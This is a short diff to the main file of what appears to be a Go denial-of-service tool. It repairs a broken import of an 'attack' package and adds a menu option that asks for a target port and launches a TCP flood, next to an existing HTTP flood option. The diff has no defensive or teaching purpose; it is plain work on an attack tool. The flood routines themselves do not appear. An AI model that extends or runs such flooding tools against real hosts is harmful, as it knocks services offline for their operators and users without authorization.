@@ -8,7 +8,7 @@ import (
 	"strings"
 	"syscall"
 
-	".s"
+	"cybertool/attack"
 )
 
 func main() {
@@ -44,7 +44,11 @@ func main() {
 		fmt.Println("[+] HTTP Flood Attack Selected.")
 		go attack.HttpFlood(target, threads)
 	case "2":
-		fmt.Println("[+] TCP Flood Not Implemented Yet") // Placeholder for TCP attack
+		fmt.Print("Enter Target Port: ")
+		var port int
+		fmt.Scanln(&port)
+		fmt.Println("[+] TCP Flood Attack Selected.")
+		attack.TcpFlood(target, port, threads)
 	default:
 		fmt.Println("[-] Invalid choice.")
 		os.Exit(1)
